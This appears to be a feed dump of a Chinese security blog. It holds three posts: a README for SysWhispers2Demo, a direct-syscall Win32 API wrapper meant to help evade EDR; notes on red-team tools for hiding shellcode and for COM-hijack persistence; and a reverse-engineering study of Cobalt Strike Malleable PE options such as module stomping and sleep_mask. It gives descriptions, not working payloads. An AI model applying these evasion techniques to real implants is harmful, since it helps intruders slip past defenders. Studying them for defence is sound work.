文件描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo主要有3个文件<code>SysWhispers2Demo.cpp</code>,<code>SysWhispers2Demo.h</code>,<code>prototypes.h</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SysWhispers2Demo.cpp文件是Ring3层的实现逻辑。目前，主要实现了包括文件操作，注册表操作，进程操作，以及线程操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件操作，基本实现了文件的创建，读写，删除等操作，具体支持的Win32 API如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateFileA</span></div><div class="line"><span class="attribute">CreateFileW</span></div><div class="line"><span class="attribute">ReadFile</span></div><div class="line"><span class="attribute">WriteFile</span></div><div class="line"><span class="attribute">NtQueryInformationFile</span></div><div class="line"><span class="attribute">NtSetInformationFile</span></div><div class="line"><span class="attribute">NtOpenFile</span></div><div class="line"><span class="attribute">NtQueryDirectoryFile</span></div><div class="line"><span class="attribute">DeleteFileA</span></div><div class="line"><span class="attribute">DeleteFileW</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注册表操作，也实现了注册表使用的常见API函数,支持两种ANSI和UNICODE字符。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">RegCreateKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegCreateKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegSetValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegDeleteValueA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegQueryValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyA</span><span class="params">(W)</span></span></div><div class="line">RegCloseKey</div><div class="line"><span class="function"><span class="title">RegQueryInfoKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyA</span><span class="params">(W)</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程操作，也实现了常见的进程使用的API函数。<strong><em>因为CreateProcess内部实现的过于复杂，目前仅仅实现了能创建进程，但是创建进程之后，需要传出的参数，如ProcessInformation没有实现</em></strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcessA</span><span class="params">(W)</span></span></div><div class="line">WinExec</div><div class="line">OpenProcess</div><div class="line">TerminateProcess</div><div class="line">ReadProcessMemory</div><div class="line">WriteProcessMemory</div><div class="line">GetExitCodeProcess</div><div class="line">GetLogicalProcessorInformation</div><div class="line">GetProcessAffinityMask</div><div class="line">IsWow64Process</div><div class="line">GetProcessId</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程操作，也实现了常见的线程使用的API函数。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateThread</span></div><div class="line"><span class="attribute">CreateRemoteThreadEx</span></div><div class="line"><span class="attribute">ResumeThread</span></div><div class="line"><span class="attribute">OpenThread</span></div><div class="line"><span class="attribute">GetThreadContext</span></div><div class="line"><span class="attribute">GetExitCodeThread</span></div><div class="line"><span class="attribute">GetProcessIdOfThread</span></div><div class="line"><span class="attribute">TerminateThread</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo.h是头文件，包含了SysWhispers2Demo.cpp的函数声明，和库所需要Nt*函数指针。前面typedef包含的是函数指针，后面是函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了增强开发的方便程度，SysWhispers2Demo采用的是和win32 API同样的函数原型，使用SysWhispers2Demo就像使用原生的Win32一模一样。仅仅需要在你所需要的Win32 API名称后面加一个Stub以示区别，例如，假如需要使用NtCreateFile创建文件，那么在Ring3需要调用CreateFileA，那只需要调用SysWhispers2Demo内置的CreateFileA_Stub。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prototypes.h包含的是一些所需要的变量类型等数据。这个是我删除了ntdll.h文件的函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面三个文件，在使用的时候，需要导入新项目。除此以外，还有两个文件，ntdll.h存储了一些函数声明和遍历类型，使用者可以在这里查看函数原型。而main.cpp我写的部分测试用例，是关于部分Win32 API的使用。<strong>这两个文件不需要导入项目。</strong></p><h2 id="0x02-使用步骤"><a href="#0x02-使用步骤" class="headerlink" title="0x02 使用步骤"></a>0x02 使用步骤</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo仅仅支持x64，x86在Syscall会遇到莫名其妙的问题，可以解决，但是不具有通用性，暂时不考虑支持x86。在win10 x64 vs2017编译通过。其他未测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在你使用SysWhispers2生成了文件之后，假设生成了文件是<code>syscall.c</code>,<code>syscall.h</code>，以及<code>syscall.asm</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步，在生成的syscall.h文件中，删除所有的变量定义。因为SysWhispers2会生成变量定义，而SysWhispers2Demo也带有变量定义，两者会冲突。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩，在生成的Syscall.h文件中，导入prototypes.h头文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三歩，在SysWhispers2Demo库文件SysWhioers2Demo.c文件中，导入syscall.h头文件，目的是修改链接的Nt函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步，注释SysWhispers2Demo库文件SysWhioers2Demo.c文件中，指定函数的动态获取函数地址的语句。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，也可以选择直接Copy SysWhispers2Demo.cpp中，你想要使用的函数。 No Care！这应该是最容易的。</p><h2 id="0x03-版本信息"><a href="#0x03-版本信息" class="headerlink" title="0x03 版本信息"></a>0x03 版本信息</h2><h3 id="v0-1-0（2022-06-20）"><a href="#v0-1-0（2022-06-20）" class="headerlink" title="v0.1.0（2022-06-20）"></a>v0.1.0（2022-06-20）</h3><ul><li>初始版本，支持常见的文件，注册表，进程，线程 API操作。</li></ul><h2 id="0x04-协议"><a href="#0x04-协议" class="headerlink" title="0x04 协议"></a>0x04 协议</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接用就是了。</p><h2 id="0x05-FAQ"><a href="#0x05-FAQ" class="headerlink" title="0x05 FAQ"></a>0x05 FAQ</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;欢迎大家提PR</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果还有需要实现的kernel层API函数，或者bug，欢迎联系wanghacky@qq.com。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-项目简介&quot;&gt;&lt;a href=&quot;#0x00-项目简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 项目简介&quot;&gt;&lt;/a&gt;0x00 项目简介&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，&lt;strong&gt;部分采用最小开发原则&lt;/strong&gt;，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:&lt;a href=&quot;https://github.com/findream/SysWhispers2Demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/findream/SysWhispers2Demo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.28-6.2）学习</title>
    <link href="https://findream.github.io/2022/06/14/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.5.28-6.2%EF%BC%89/"/>
    <id>https://findream.github.io/2022/06/14/绿盟科技-每周蓝军技术推送（2022.5.28-6.2）/</id>
    <published>2022-06-14T06:02:11.000Z</published>
    <updated>2022-06-14T13:09:49.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg" target="_blank" rel="external">每周蓝军技术推送（2022.5.28-6.2</a></li><li>这一周的内容推送主要是一些工具推荐</li><li>释放UDRL（用户定义反射加载器）内存的BOF</li><li>基于低熵的香农编码隐藏shellcode</li><li>Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</li><li>C# 编写的 COM 劫持持久化辅助工具<a id="more"></a></li></ul><h2 id="0x01-调试和逆向ALPC"><a href="#0x01-调试和逆向ALPC" class="headerlink" title="0x01 调试和逆向ALPC"></a>0x01 调试和逆向ALPC</h2><ul><li>ALPC调试比较复杂没有仔细看。除了<a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html" target="_blank" rel="external">这篇文章(调试和逆向ALPC)</a>之外，还有<a href="https://bbs.pediy.com/thread-268225.htm" target="_blank" rel="external">win10 1909逆向（ALPC通信原理浅析</a>等可以参考。</li></ul><h2 id="0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"><a href="#0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF" class="headerlink" title="0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"></a>0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF</h2><ul><li>这就是一个释放UDRL(用户定义反射加载器)的BOF。</li><li>BOF:即Beacon Object Files。是c编译后的文件，其有点就是小，可以在beacon内部使用，缺点就是会引发beacon崩溃。</li><li>关于BOF，可以看官方出的<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">文章</a></li></ul><h2 id="0x03-Shelltropy：基于低熵的香农编码隐藏shellcode"><a href="#0x03-Shelltropy：基于低熵的香农编码隐藏shellcode" class="headerlink" title="0x03 Shelltropy：基于低熵的香农编码隐藏shellcode"></a>0x03 Shelltropy：基于低熵的香农编码隐藏shellcode</h2><ul><li>一个概念：信息熵/香农熵：一组信息中随机性的量度，信息越随机，熵越高。</li><li>一个重要结论：bin通过加密混淆或者加壳，会导致信息熵增加。多数恶意软件，信息熵偏高。</li><li>如何降低熵，规避EDR：之前了解过，将加密数据嵌入正常的可执行文件可以避免高熵。</li><li>Shelltropy作者所写的<a href="https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/" target="_blank" rel="external">文章</a>的思路是通过向高熵的数据中插入低熵的数据，可以将整体的熵降低。但是这么做会使shellcode增大一倍。<br> <img src="http://hacky.wang/blog/20220613/Lk1z89W0zf5w.png?imageslim" alt="mark"></li><li>Ref：<a href="https://github.com/kleiton0x00/Shelltropy/blob/main/README.md" target="_blank" rel="external">https://github.com/kleiton0x00/Shelltropy/blob/main/README.md</a></li></ul><h2 id="0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"><a href="#0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放" class="headerlink" title="0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"></a>0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</h2><ul><li><a href="https://github.com/Cracked5pider/KaynStrike" target="_blank" rel="external">KaynStrike</a>设计确实很巧妙，首先，工具分段把PE数据写入当前进程空间，然后拉起一个线程，并将EIP设置成之前那段数据的入口点，Resume之后，便执行了beacon代码，之后，主线程这边采用同样的方法执行NtFreeVirtualMemoryAPI函数，进行free。</li></ul><h2 id="0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具"><a href="#0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具" class="headerlink" title="0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具"></a>0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具</h2><ul><li><a href="https://github.com/nickvourd/COM-Hunter" target="_blank" rel="external">https://github.com/nickvourd/COM-Hunter</a>阅读了该工具的部分源码，其[内置]了一些可以被COM劫持的CLSID列表，没什么可说的。关于如何狩猎可以被COM劫持的CLSID可以参考<a href="https://www.4hou.com/posts/Mo51" target="_blank" rel="external">持久性COM劫持的实现 - 嘶吼</a>等文章，除此以外<a href="https://github.com/findream/SecStudy/blob/main/ATT-CK/Remote-ComHiJack/ReadMe.md" target="_blank" rel="external">我的github</a>上有一个可以远程狩猎COM劫持的工具。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.5.28-6.2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;这一周的内容推送主要是一些工具推荐&lt;/li&gt;
&lt;li&gt;释放UDRL（用户定义反射加载器）内存的BOF&lt;/li&gt;
&lt;li&gt;基于低熵的香农编码隐藏shellcode&lt;/li&gt;
&lt;li&gt;Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放&lt;/li&gt;
&lt;li&gt;C# 编写的 COM 劫持持久化辅助工具
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Malleable PE</title>
    <link href="https://findream.github.io/2022/06/06/CobaltStrike%20Malleable%20PE/"/>
    <id>https://findream.github.io/2022/06/06/CobaltStrike Malleable PE/</id>
    <published>2022-06-06T04:02:11.000Z</published>
    <updated>2022-09-14T13:19:51.905Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转载于跳跳糖安全社区，原文链接为<a href="https://tttang.com/archive/1662/" target="_blank" rel="external">https://tttang.com/archive/1662/</a></li></ul><a id="more"></a><h2 id="0x00-Malleable-PE"><a href="#0x00-Malleable-PE" class="headerlink" title="0x00 Malleable PE"></a>0x00 Malleable PE</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Malleable PE 直译就是可拓展PE，通常来说，很多同学在做免杀的时候，会针对Loader进行免杀，并不会考虑针对beacon进行免杀，这就导致了很多杀软/EDR的内存防护能针对默认设置的beacon进行查杀。C2Profile提供了很好地操作beacon的方法，C2Profile不仅仅可以自定义beacon的通信属性(例如uri，header等等)，还可以对beacon进行操作，从而实现免杀的目的。</p><h2 id="0x01-stage指标"><a href="#0x01-stage指标" class="headerlink" title="0x01 stage指标"></a>0x01 stage指标</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C2Profile文件的stage块控制beacon的相关属性。如下图是官方文档提供的默认stage块。这个默认配置中，大概配置了一下几个属性，<code>userwx</code>,<code>complie_time</code>,<code>image_size_x86</code>,<code>image_size_x64</code>,<code>obfuscate</code>等等。这几个属性可以决定beacon部分PE属性和部分操作。<br>    <img src="http://hacky.wang/blog/20220630/hxa1MphY2grr.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>transform-x86</code>或者<code>transform-x64</code>可以修改反射dll的数据。这两个块支持3个命令，<code>prepend</code>,<code>append</code>,<code>strrep</code>。<code>prepend</code>是在beacon之前添加字节数据，这样可以规避那些单纯检测内存开头部分数据的EDR。<code>append</code>是在beacon数据之后添加额外的数据，而<code>strrep</code>则是替换字符串操作，其实很多厂商会将beacon的导出函数<code>ReflectiveLoader</code>作为检测的一个点，具体可以看flu0rite的<a href="https://xz.aliyun.com/t/9224?page=1" target="_blank" rel="external">记一次cs bypass卡巴斯基内存查杀</a>，这篇文章详细介绍了卡巴针对beacon的内存查杀的特征，其中就有<code>ReflectiveLoader</code>。<br>    <img src="http://hacky.wang/blog/20220630/EbHMotGsr3a0.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外呢，stage还可以将字符串添加到beacon的.rdata段。<br>    <img src="http://hacky.wang/blog/20220630/qEkEY6sSbP5A.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是针对stage块的一些配置属性。</p><ul><li>checksum：Beacon的PE的检验和</li><li>cleanup：释放反射dll的内存</li><li>compile_time：编译时间</li><li>entry_point：入口点</li><li>image_size_x86(image_size_x64)：Beacon的PE的SizeOfImage(映像大小)</li><li>module_x86(module_x64)：默认情况下，beacon是通过VirtualAlloc开辟内存的，如果设置module_x86属性，就可以Load module_x86指定的模块，然后将beacon复写到该模块的内存区域。</li><li>name：决定beacon dll导出表的名字</li><li>obfuscate：加密beacon Dll的导入表，复写未使用的header内容，以及让ReflectiveLoader将beacon拷贝到新的内存区域</li><li>rich_header：rich_header是<code>PE</code>这个MagicNumber后面的pe数据</li><li>sleep_mask：在sleep之前混淆beacon，避免内存查杀</li><li>smartinject： Beacon 将关键函数指针（如 GetProcAddress 和 LoadLibrary）嵌入到同架构的post-ex DLL中。 这使 post-ex DLL可以在新进程中进行自我引导，而不会出现类似shellcode的行为，如使用PEB寻找kernel32.dll和其中的函数指针。</li><li>stomppe：在加载完beacon之后，修改Characteristic值</li><li>userwx：是否使用RWX权限，RWX容易引起怀疑</li><li>allocator：控制Beacon反射加载器初始化时使用的内存分配函数（VirtualAlloc，HeapAlloc，MapViewOfFile）默认使用VirtualAlloc函数<br>  <img src="http://hacky.wang/blog/20220630/GhPeDSNxAakM.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20220630/ePky5vsJ8Gou.png?imageslim" alt="mark"></li></ul><h2 id="0x02-C2Profile加载"><a href="#0x02-C2Profile加载" class="headerlink" title="0x02 C2Profile加载"></a>0x02 C2Profile加载</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TeamServer负责加载C2Profile文件，IDEA中找到server/TeamServer.java，在绿色三角启动调试，注意，在debug窗口中，点击扳手按钮，以设置调试选项。依次设置VM Optional，可以将TeamServer这个文件的设置直接复制进去，我这里设置的是<code>-XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -XX:+AggressiveHeap -XX:+UseParallelGC</code>。然后添加主类，最后添加要调试的参数即可。<br>    <img src="http://hacky.wang/blog/20220630/d3k6KhQYc8Xf.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/rtCalYbVwiGu.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先判断端口是否有效。然后加载C2Profile文件。<br>    <img src="http://hacky.wang/blog/20220630/00rW7h5HLjUK.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/l17Wg2J7Ptga.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将C2Profile文件按行读取，以’\n’分割。<br>    <img src="http://hacky.wang/blog/20220630/kkK6cUEDOxUo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后对C2Profile进行解析，首先对Profile这个结构体进行初始化，这里面存储的是一些默认的C2Profile设置。然后调用Loader.parse进行解析读取到的C2Profile文件内容，<br>    <img src="http://hacky.wang/blog/20220630/bYFLB42ewHks.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/Q14vf6lmHawU.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这就是最后解析结果，最后在<code>TeamServer.go()</code>注册监听器(Listeners)，Beacons，Phisher等组件。最后建立监听，等待GUI进行链接。然后建立客户端的认证，然后拉起线程和客户端进行socket链接。<br>    <img src="http://hacky.wang/blog/20220630/CbwJqd5hRMF7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/tJ8A51A60QX7.png?imageslim" alt="mark"></p><h2 id="0x03-beacon差异性分析"><a href="#0x03-beacon差异性分析" class="headerlink" title="0x03 beacon差异性分析"></a>0x03 beacon差异性分析</h2><h3 id="0x3-1-module-x86"><a href="#0x3-1-module-x86" class="headerlink" title="0x3.1 module_x86"></a>0x3.1 module_x86</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，采用默认的C2Profile生成beacon文件，至于生成beacon的流程可以参考<a href="https://tttang.com/archive/1631/" target="_blank" rel="external">这篇文章</a>。然后测试一下<code>module_x86</code>属性。修改C2Profile文件的stage块。添加<code>set module_x86 &quot;xpsservices.dll&quot;;</code>这个语句。module_x86这个语句的作用是加载module_x86指定的模块，然后将beacon复写到该模块的内存区域。<br>    <img src="http://hacky.wang/blog/20220630/JXDvesPjVp5c.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在MalleablePE.java的<code>pre_process</code>会根据c2profile的set命令获取相对于的值，然后根据值对PE进行对于的操作。<br>    <img src="http://hacky.wang/blog/20220630/ocvcbKABCAcb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/OfmgiTaClxeI.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>setModuleStomp</code>这个方法中，首先将设置Characteristic为0x4000。然后在PE偏移为0x40的地方，添加大小为0x40的随机数据，接着在将C2Profile解析到的模块名(xpsservices.dll)写入PE偏移为0x40的地方，相当于重新覆盖直接写的随机数据的一部分。由此完成操作。<br>    <img src="http://hacky.wang/blog/20220630/9u2wKr0Hdsvm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对比一下生成的修改过module_x86属性的beacon.bin,和默认C2Profile生成的beacon.bin数据。有效的差异就是在PE+0x40出存在一个模块名。<br>    <img src="http://hacky.wang/blog/20220630/GIC0dckNuHuI.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了方便调试，生成一个beacon.exe程序，执行到beacon的时候，在PE偏移+0x40处下访问断点，以及针对LoadLibrary(Ex)W(A)下断点，程序中断在<code>003A82DF</code>处，每个断点都不一样。<br>    <img src="http://hacky.wang/blog/20220630/wNqDJ4QTvgaf.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/sbrwvssKe89k.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后逻辑就很清楚了，首先加载指定的Module，然后通过函数需要，获取导出函数地址，分别将PE头和节区数据复制到目的地址。<br>    <img src="http://hacky.wang/blog/20220630/gQJXvIp85hvQ.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后解析入口点，进行跳转即可<br>    <img src="http://hacky.wang/blog/20220630/DIa1o2psyVts.png?imageslim" alt="mark"></p><h3 id="0x3-2-stomppe"><a href="#0x3-2-stomppe" class="headerlink" title="0x3.2 stomppe"></a>0x3.2 stomppe</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过<code>set stomppe &quot;true&quot;</code>启用stomppe，看官方文档的介绍，stomppe的目的是轻微混淆内存中的Dll beacon，通过查看源码，通过了解<code>PEEditor.setCharacteristic</code>函数发现，该函数目的就是修改PE文件头中的Characteristic属性，这个属性和该文件的类型有关。用PEview查看默认生成的beacon文件，通过该属性值很显然的发现，这是一个32bit的dll可执行文件。感觉这个功能挺鸡肋的。<br>    <img src="http://hacky.wang/blog/20220630/XYVCRl6MJ305.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220630/SpIMi09Hwrg0.png?imageslim" alt="mark"></p><h3 id="0x3-3-sleep-mask"><a href="#0x3-3-sleep-mask" class="headerlink" title="0x3.3 sleep_mask"></a>0x3.3 sleep_mask</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep_mask的作用是在sleep之前加密beacon以规避基于内存特征的查杀。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中断在<code>BeaconPayload.setupGargle</code>方法处，首先，在setupGargle函数中，重新读取了resources/beacon.dll数据，然后将.text段的EndAddr保存在Settings的序号为41的地址处。<br>    <img src="http://hacky.wang/blog/20220701/PQuinvVyJTmh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后计算rdata段和.text段之间的间距，如果间距小于256则不行。开始我很迷惑这步的操作，在后面的分析调试过程中，才发现，这个区域存储的是加密函数，而且当时我也好奇，如果要加密几个节区的话，代码段一旦被加密，事后怎么解密呢?其实CobaltStrike的设计者非常巧妙。<br>    <img src="http://hacky.wang/blog/20220701/xeG8iUSW0F52.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后获取了所有的Sections的起始地址和结束地址，并将其保存在序号为42的Settings处。<br>    <img src="http://hacky.wang/blog/20220701/9axT1NYmtHAf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;生成并调试beacon.exe，通过之前的分析，sleep_mask作用就是在beacon 休眠之前加密beacon，所以只需要在beacon所存放的内存区域设置访问断点即可。具体可以这样操作，假设beacon分配在0x00300000处，首先，针对使程序运行到337D06处，这是程序暴力枚举到beacon区域起始地址，也就是0x00300000处。我们首先需要跳过这部分。然后在0x00300000处下访问断点，运行后断在0x003383D8处，<br>    <img src="http://hacky.wang/blog/20220701/yLA72TN3SkNa.png?imageslim" 